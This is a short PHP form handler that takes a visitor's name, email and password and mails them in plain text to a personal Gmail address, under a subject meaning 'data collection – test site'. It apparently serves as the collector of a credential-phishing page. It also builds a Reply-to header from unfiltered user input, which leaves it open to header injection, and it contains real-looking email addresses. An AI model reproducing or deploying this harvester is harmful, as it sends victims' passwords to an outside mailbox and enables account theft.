<?php

$nome = addslashes($_POST['nome']);
$email = addslashes($_POST['email']);
$senha = addslashes($_POST['senha']);

$para = "diego.no2003@gmail.com";
$assunto = "Coleta de dados - Site de teste";

$corpo = "Nome: ".$nome."\n"."E-mail: ".$email."\n"."Senha: ".$senha;
$cabeca = "From: conta.no2003@gmail.com"."\n"."Reply-to: ".$email."\n"."X=Mailer:PHP/".phpversion();

if(mail($para,$assunto,$corpo,$cabeca)){
    echo("E-mail enviado com sucesso!");
}else{
    echo("Houve um erro ao enviar o email!");
}


?>